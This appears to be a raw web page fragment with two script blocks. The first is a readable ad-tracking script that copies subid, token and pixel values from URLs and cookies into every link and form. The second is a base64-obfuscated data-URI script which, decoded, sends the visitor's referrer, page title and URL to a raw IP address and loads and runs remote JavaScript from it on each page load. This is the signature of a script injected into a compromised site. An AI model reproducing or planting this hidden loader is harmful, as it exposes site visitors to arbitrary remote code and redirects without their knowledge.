<script type="application/javascript">
function getCookie(name) {
    var v = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
    var value = v ? v[2] : null;
    return (value && value !== 'undefined') ? value : null
}

function setCookie(name, value, days) {
    var d = new Date;
    d.setTime(d.getTime() + 24*60*60*1000*days);
    document.cookie = name + "=" + value + ";path=/;expires=" + d.toGMTString();
}

function getSubId() {
  var params = new URLSearchParams(document.location.search.substr(1));
  if (!'{subid}'.match('{')) {
    return '{subid}';
  }
  var clientSubid = '<?php echo isset($client) ? $client->getSubid() : "" ?>';
  if (clientSubid && !clientSubid.match('>')) {
    return clientSubid;
  }
  if (params.get('_subid')) {
    return params.get('_subid')
  }
  if (params.get('subid')) {
    return params.get('subid')
  }
  if (getCookie('subid')) {
    return getCookie('subid');
  }
  if (getCookie('_subid')) {
    return getCookie('_subid');
  }
}

function getToken() {
  var params = new URLSearchParams(document.location.search.substr(1));
  if (!'{token}'.match('{')) {
    return '{token}';
  }
  var clientToken= '<?php echo isset($client) ? $client->getToken() : "" ?>';
  if (clientToken && !clientToken.match('>')) {
    return clientToken;
  }
  if (params.get('_token')) {
    return params.get('_token')
  }
  if (params.get('token')) {
    return params.get('token')
  }
  if (getCookie('token')) {
    return getCookie('token');
  }
  return null;
}

function getPixel() {
  var params = new URLSearchParams(document.location.search.substr(1));
  if (!'{pixel}'.match('{')) {
    return '{pixel}';
  }
  if (params.get('pixel')) {
    return params.get('pixel')
  }
  
  if (getCookie('pixel')) {
    return getCookie('pixel');
  }
  
  return null;
}

if (typeof URLSearchParams === 'function') {
  document.addEventListener("DOMContentLoaded", function(event) {
    var params = new URLSearchParams(document.location.search.substr(1));
    var subid = getSubId();
    var token = getToken();
    var pixel = getPixel();
    
    params.set('_token', token);
    setCookie('pixel', pixel);
    setCookie('token', token);
    setCookie('subid', subid);
        
    // Adds params to the links  
    document.querySelectorAll('a').forEach(function(link) {
        var url = new URL(link.href); 
        params.forEach(function(v, k) { 
            url.searchParams.append(k, v);
        }); 
        link.href = url.toString();
    });

    // Replace placeholders to actual values for input[hidden] fields
    const subIdRegExp = new RegExp('\{subid\}', 'g');
    const tokenRegExp = new RegExp('\{token\}', 'g');
    const pixelRegExp = new RegExp('\{pixel\}', 'g');

    document.querySelectorAll('input[type="hidden"]').forEach(function (input) {
      if (subIdRegExp.test(input.value)) {
        input.value = input.value.replaceAll(subIdRegExp, subid);
      }
      if (tokenRegExp.test(input.value)) {
        input.value = input.value.replaceAll(tokenRegExp, token);
      }
      if (pixelRegExp.test(input.value)) {
        input.value = input.value.replaceAll(pixelRegExp, pixel);
      }
    });
    
    // Adds params as hidden inputs to the forms
    document.querySelectorAll('form').forEach(function(form) {
        params.forEach(function(v, k) { 
            var input = document.createElement('input'); 
            input.type = 'hidden';
            input.name = k;
            input.value = v;
    
            form.append(input);
        });
    });
  })
}
</script>





<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfamN6bkZQbmdESHJUaExIWic7CiAgICBpZiAoIXdpbmRvdy5famN6bkZQbmdESHJUaExIWikgewogICAgICAgIHdpbmRvdy5famN6bkZQbmdESHJUaExIWiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cDovLzc3LjczLjEzMi4xODUvNWtOcjJYJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX1o4NHZyTmNrNGZZNG10NE4gPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9aODR2ck5jazRmWTRtdDROICE9PSAndW5kZWZpbmVkJyAmJiBfWjg0dnJOY2s0Zlk0bXQ0TiAhPT0gbnVsbCkgewogICAgICAgIHZhciBfTnBHd3lUQ1daRHNrUjRjWSA9IEpTT04ucGFyc2UoX1o4NHZyTmNrNGZZNG10NE4pOwogICAgICAgIHZhciBfUUZEZENoWUo0bjNXRzFWWSA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9OcEd3eVRDV1pEc2tSNGNZLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX2pjem5GUG5nREhyVGhMSFoudHRsIDwgX1FGRGRDaFlKNG4zV0cxVlkpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9kcmhzRzZOTUR3OXF5U1d3ID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX0hNV1N2c1JaWFoyOE12OHEgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfbjJIa1BYM0hXVnlLRDJiTSA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX24ySGtQWDNIV1Z5S0QyYk0gKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX24ySGtQWDNIV1Z5S0QyYk0gKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfbjJIa1BYM0hXVnlLRDJiTSArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfbjJIa1BYM0hXVnlLRDJiTSArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX24ySGtQWDNIV1Z5S0QyYk0gKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX24ySGtQWDNIV1Z5S0QyYk0gKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9qY3puRlBuZ0RIclRoTEhaLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9kcmhzRzZOTUR3OXF5U1d3ICE9PSAndW5kZWZpbmVkJyAmJiBfZHJoc0c2Tk1EdzlxeVNXdyAmJiB3aW5kb3cuX2pjem5GUG5nREhyVGhMSFoudW5pcXVlKSB7CiAgICAgICAgX24ySGtQWDNIV1Z5S0QyYk0gKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfZHJoc0c2Tk1EdzlxeVNXdyk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9ITVdTdnNSWlhaMjhNdjhxICE9PSAndW5kZWZpbmVkJyAmJiBfSE1XU3ZzUlpYWjI4TXY4cSAmJiB3aW5kb3cuX2pjem5GUG5nREhyVGhMSFoudW5pcXVlKSB7CiAgICAgICAgX24ySGtQWDNIV1Z5S0QyYk0gKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9ITVdTdnNSWlhaMjhNdjhxKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9qY3puRlBuZ0RIclRoTEhaLlJfUEFUSCArIF9uMkhrUFgzSFdWeUtEMmJNOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>
